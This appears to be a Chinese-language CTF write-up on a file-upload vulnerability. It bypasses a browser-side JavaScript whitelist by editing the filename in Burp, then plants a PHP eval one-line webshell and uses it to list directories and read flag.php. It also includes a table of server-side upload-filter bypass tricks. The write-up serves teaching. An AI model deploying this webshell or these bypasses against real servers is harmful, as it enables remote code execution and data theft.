## 一句话概括

文件上传漏洞的本质是：**服务器把用户上传的文件保存到了能被 Web 访问的位置，又按扩展名把它交给 PHP 解释器执行**。而所有发生在**浏览器里的校验**（JS 白名单、`accept` 属性）都位于攻击者下游，抓包即可绕过。

## 本题情景与解题手法

### 题目形态

一个图片上传页，选择文件后由 JS 判断类型：

- 上传非图片文件（如 `e.php`）时，**页面直接弹窗提示"仅允许上传图片"**，请求根本没发出去；
- 禁用浏览器 JS 后，弹窗消失，但**上传按钮也失效**，无法提交。

这两个现象是判断"前端 WAF"的关键证据。

### 第一步：确认校验在客户端

判断依据有两条，原笔记写得很准：

1. **"上传不支持格式时抓包无法抓到"** —— 说明请求在浏览器里就被拦截了，压根没到 Burp；
2. **"禁用 JS 后无法抓包"** —— 说明上传流程本身由 JS 驱动。

两条都能推出同一个结论：**校验发生在浏览器端**。

> 此处原为「上传 php 时页面弹出类型拦截提示」的截图，要点：弹窗出现即证明是前端校验。

### 第二步：绕过前端，把请求发出去

绕过前端校验最省事的做法是**不改前端、只改数据包**：

1. 先把木马文件改名为 `e.png`（骗过 JS 的后缀检查）；
2. 正常点击上传，在 Burp 里把请求拦下来；
3. 把 multipart 分片里的 `filename="e.png"` 改回 `e.php`；
4. 放行请求。

因为 JS 校验的是"你选择时看到的文件名"，而真正发给服务器的是 Burp 放行的那一份，两者可以不一致。

### 第三步：访问上传结果，进入后门

上传成功后，访问木马路径并执行命令：

```http
GET /upload/e.php?cmd=system('ls'); HTTP/1.1
Host: 靶机地址
```

回显结果是 `e.php`：

```text
e.php
```

说明**后门已经执行成功**（输出的是当前目录列表），但当前目录里没有 flag。

### 第四步：目录遍历找 flag

先看看上一级目录（`ls` 后的空格不能少）：

```http
GET /upload/e.php?cmd=system('ls ../'); HTTP/1.1
Host: 靶机地址
```

```text
flag.php  images  index.php  js  layui  upload  upload.php
```

flag 在 **网站根目录** 的 `flag.php` 里。

### 第五步：读取 flag —— 只差一个 `../`

直接读根目录是不行的：

```http
# 失败：No such file or directory
GET /upload/e.php?cmd=system('tac /flag.php'); HTTP/1.1
```

加上 `../` 就成功：

```http
# 成功
GET /upload/e.php?cmd=system('tac ../flag.php'); HTTP/1.1
```

差别就在于路径的**参照点**，见下方"相对路径与绝对路径"。

### 上传手法一句话总结

> **前端 JS 白名单** → 改文件名骗过前端 + **Burp 抓包把 `filename` 改回 `.php`** → 请求送达后端（后端无校验）→ 文件落盘到 `/upload/` → 访问 `e.php?cmd=system(...)` 执行命令 → `ls ../` 定位网站根目录 → `tac ../flag.php` 读出 flag。

## 原理

### 1. 一次上传要穿过哪几道关

![文件上传校验链路与绕过点](../_assets/upload-validation-bypass.svg)

校验可能出现在链路的任意一环，**判断"关卡在哪"比急着换 payload 重要得多**。

### 2. 为什么前端校验必然可绕

前端的校验代码运行在**用户的浏览器**里，而用户对自己的浏览器拥有完全控制权：

| 攻击者动作 | 结果 |
|---|---|
| 直接抓包改包再放行 | 请求根本没经过 JS 校验逻辑 |
| 禁用 JS | 校验函数不再执行（但可能连带整个上传逻辑失效，本题就是如此） |
| 控制台改写校验函数 | 让 `validateFile()` 恒返回 `true` |
| 修改 `<input>` 的 `accept` 属性 | 文件选择框不再限制类型 |

**核心**：客户端校验只能约束"守规矩的用户"，对拿着代理工具的攻击者没有任何强制力。服务器**必须**在收到文件后再校验一次，否则形同虚设。

### 3. 前端校验函数长什么样

```javascript
// 原始：严格校验
function validateFile(file) {
    const allowedTypes = ['image/jpeg', 'image/png'];
    return allowedTypes.includes(file.type);
}
```

在开发者工具里把它改成"永远通过"：

```javascript
// 修改为：无条件通过
function validateFile(file) {
    return true;
}
```

另一种"偷梁换柱"的思路是重写字符串方法，让校验逻辑永远走不到拦截分支：

```javascript
String.prototype.includes = function () { return false; };
Array.prototype.includes  = function () { return false; };
```

还有一种常见形态是组件配置串：

```javascript
"{url:'upload.php',accept:'images',exts:'php'}"
```

其中 `accept:'images'` 只影响**文件选择框的显示**（用户只能看到图片），而 `exts:'php'` 才是后端真正允许的后缀。把 `accept` 改成 `'*'` 就能在界面里看到所有文件：

| 配置 | `accept` | 界面表现 | 安全影响 |
|---|---|---|---|
| 原始 | `'images'` | 只显示图片 | 隐蔽后门，普通用户无法利用 |
| 修改后 | `'*'` | 显示所有文件 | 任意文件都能选中并上传 |

> 注意：改这些 JS 只是让"你自己"能更方便地发出请求。**真正决定成败的仍是后端的校验规则** —— 前端改得再花哨，后端白名单卡死照样过不去。

### 4. 一句话木马

```php
<?php @eval($_REQUEST['cmd']); ?>
```

- `eval()` 把字符串当 PHP 代码执行，`$_REQUEST` 同时接收 GET / POST / COOKIE；
- 用蚁剑（AntSword）连接 `http://靶机地址/upload/e.php`，填上密码 `cmd`，即可图形化浏览文件、执行命令；
- 手工利用则直接拼 URL：`e.php?cmd=system('ls');`

## 相对路径与绝对路径（本题最容易困惑的点）

### 现象

| 命令 | 结果 |
|---|---|
| `system('tac ../flag.php')` | 成功 |
| `system('tac /flag.php')` | 失败 |

### 原因

根本在于**当前工作目录（cwd）**：

- **相对路径**以"当前所在位置"为参照。脚本 `/var/www/html/upload/e.php` 执行时，cwd 通常是脚本所在目录 `/var/www/html/upload`；`../flag.php` 就是 `/var/www/html/flag.php` —— **网站根目录下的那个文件**，命中。
- **绝对路径**以**文件系统根 `/`** 为参照。`/flag.php` 指的是系统根目录下的 `/flag.php`。这个文件在本题环境中并不存在（flag 放在网站目录下），所以报 `No such file or directory`；即使存在，Web 用户通常也没有读根目录文件的权限。

```text
/                        <-- 系统根目录（`/flag.php` 会来这里找，通常不存在）
├── var/
│   └── www/
│       └── html/        <-- 网站根目录
│           ├── flag.php          <-- 真正要找的文件（`../flag.php` 命中这里）
│           └── upload/
│               └── e.php         <-- 木马在这里执行，cwd 就是 upload/
├── home/
└── etc/
```

### 结论

**不是"绝对路径不行"，而是"要写完整的绝对路径"**：

| 写法 | 解析目标 | 结果 |
|---|---|---|
| `tac /flag.php` | `/flag.php` | 失败（路径不完整） |
| `tac /var/www/html/flag.php` | 完整绝对路径 | 成功 |

- 相对路径：短，但依赖 cwd，换个工作目录就失效；
- 绝对路径：可靠，但**必须给出从 `/` 开始的完整路径**，只写一个文件名是不行的。

## 利用条件

1. **有上传点**，且文件保存到 Web 可访问目录
2. **后端对扩展名/类型校验不足**，或校验可被绕过
3. **上传的脚本能被解析**（扩展名在解析规则内，或能用 `.user.ini`/`.htaccess` 改变规则）
4. **知道落盘路径**（或能从回显、目录遍历推断）

## 校验类型 → 绕过手法对照表

| 校验位置 | 校验内容 | 绕过手法 | 详见 |
|---|---|---|---|
| 前端 JS | `accept`、后缀白名单 | 抓包直发 / 禁用 JS / 改 JS 函数 / 控制台改配置 | 本文 |
| 服务端 | `Content-Type`（MIME） | 抓包改成 `image/png`、`image/jpeg` | 02 |
| 服务端 | 后缀黑名单 | `php5`/`phtml`/大小写/双扩展名/`%00` 截断 | 03 |
| 服务端 | 后缀白名单 | `.user.ini` / `.htaccess` 改写解析规则 | 03、04 |
| 服务端 | 魔术字节（文件头） | 正文开头加 `GIF89a`、`\x89PNG` | 03 |
| 服务端 | 文件内容正则 | 大小写混淆、短标签 `<?=`、注释拼接 | 05 |
| 保存环节 | 路径 / 文件名 | `../` 目录穿越、文件名注入 | 07 |

## 踩坑与备注

- **判断前端还是后端，看"请求有没有发出去"**：抓不到包 = 请求死在浏览器里 = 前端校验；抓到了但被拒 = 后端校验。这一步决定了后面往哪个方向绕。
- **禁用 JS 是本末倒置**：本题禁用 JS 后上传按钮也失效了，所以原笔记走了"抓包改包"的正路。禁用 JS 只适合校验与提交流程分离的站点。
- **改包时 `Content-Length` 会自动重算**：Burp 里改完 `filename` 后长度变了，注意让工具重算（默认会自动处理），否则请求会被截断。
- 原文提到的本地木马存放位置（`D:\ctf\后门`）属于本机路径，已抽象掉；实际就是"本地准备一个 `e.php` 内容为 `<?php @eval($_REQUEST['cmd']);?>` 的文件"。
- **`tac` 而不是 `cat`**：本题 `cat` 被后端过滤，`tac`（反向输出）能直接看到 flag（flag 常在文件最后一行），这也是后续几道题一直沿用 `tac` 的原因。
